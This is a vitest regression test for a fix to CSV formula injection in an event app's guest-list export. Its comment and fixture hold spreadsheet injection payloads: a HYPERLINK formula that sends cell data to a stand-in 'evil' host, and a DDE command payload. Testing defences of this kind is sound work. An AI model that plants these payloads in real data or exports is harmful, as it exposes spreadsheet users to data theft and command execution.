// SEC-16 — CSV formula injection in the guest-list export.
//
// Bug (found 2026-06, security review): the `esc()` helper in
// app/e/[slug]/guests.csv/route.ts only quote-doubled values. CSV quoting does
// not stop spreadsheet formula evaluation, and guestName/guestEmail are fully
// attacker-controlled (anyone who can RSVP). A guest named
// `=HYPERLINK("http://evil/?"&A1)` or `=cmd|'/c calc'!A1` executes/exfiltrates
// when the host opens the export in Excel/Sheets.
//
// Fix: prefix any cell beginning with = + - @ tab or CR with a single quote
// before quoting. This test drives the real GET handler and asserts the
// dangerous leading character is neutralized.

import { describe, it, expect, vi, beforeEach } from "vitest";

const { mockEventFindUnique, mockRsvpFindMany } = vi.hoisted(() => ({
  mockEventFindUnique: vi.fn(),
  mockRsvpFindMany: vi.fn(),
}));

vi.mock("@/lib/db", () => ({
  db: {
    event: { findUnique: mockEventFindUnique },
    rSVP: { findMany: mockRsvpFindMany },
  },
}));

vi.mock("@/lib/session", () => ({
  getSession: vi.fn(),
}));

import { getSession } from "@/lib/session";
import { GET } from "@/app/e/[slug]/guests.csv/route";

const mockGetSession = getSession as ReturnType<typeof vi.fn>;

describe("SEC-16: CSV formula injection in guest export", () => {
  beforeEach(() => {
    mockEventFindUnique.mockReset();
    mockRsvpFindMany.mockReset();
    mockGetSession.mockReset();
  });

  it("neutralizes a formula-injection guest name with a leading apostrophe", async () => {
    mockGetSession.mockResolvedValue({ userId: "host1", role: "HOST" });
    mockEventFindUnique.mockResolvedValue({ id: "evt1", hostId: "host1", coHosts: [] });
    mockRsvpFindMany.mockResolvedValue([
      {
        guestName: `=HYPERLINK("http://evil/?"&A1)`,
        guestEmail: `+15551234567`,
        status: "GOING",
        plusOneCount: 0,
        approved: true,
        createdAt: new Date("2026-06-27T00:00:00.000Z"),
      },
    ]);

    const res = await GET(new Request("http://localhost:3000/e/party/guests.csv"), {
      params: Promise.resolve({ slug: "party" }),
    });
    const csv = await res.text();

    // The name cell must be prefixed with ' so spreadsheets treat it as text.
    expect(csv).toContain(`"'=HYPERLINK(""http://evil/?""&A1)"`);
    // The leading-+ email is also neutralized.
    expect(csv).toContain(`"'+15551234567"`);
    // A raw, unneutralized formula cell must NOT be present.
    expect(csv).not.toContain(`"=HYPERLINK`);
  });
});
